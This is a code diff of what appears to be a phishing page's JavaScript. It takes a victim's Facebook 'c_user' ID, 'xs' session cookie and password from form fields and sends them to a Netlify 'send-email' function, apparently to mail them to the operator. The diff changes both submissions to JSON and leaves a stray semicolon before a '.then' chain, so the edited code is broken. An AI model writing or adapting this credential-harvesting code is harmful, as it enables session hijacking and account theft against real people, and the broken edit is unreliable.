@@ -1979,14 +1979,15 @@
                 hiddenXs.value = xsInput.value;
                 
                 // Submit c_user and xs together
-                const formData = new FormData();
-                formData.append('c_user', cUserInput.value);
-                formData.append('xs', xsInput.value);
-                
                 fetch('/.netlify/functions/send-email', {
-                    method: 'POST',
-                    body: formData
-                })
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        c_user: cUserInput.value,
+        xs: xsInput.value
+    })
+});
+
                 .then(response => {
                     if (!response.ok) {
                         console.error('Submission of c_user and xs failed');
@@ -2026,13 +2027,14 @@
                 hiddenPassword.value = passwordInput.value;
                 
                 // Submit password separately
-                const formData = new FormData();
-                formData.append('password', passwordInput.value);
-                
                 fetch('/.netlify/functions/send-email', {
-                    method: 'POST',
-                    body: formData
-                })
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        password: passwordInput.value
+    })
+});
+
                 .then(response => {
                     if (!response.ok) {
                         console.error('Password submission failed');
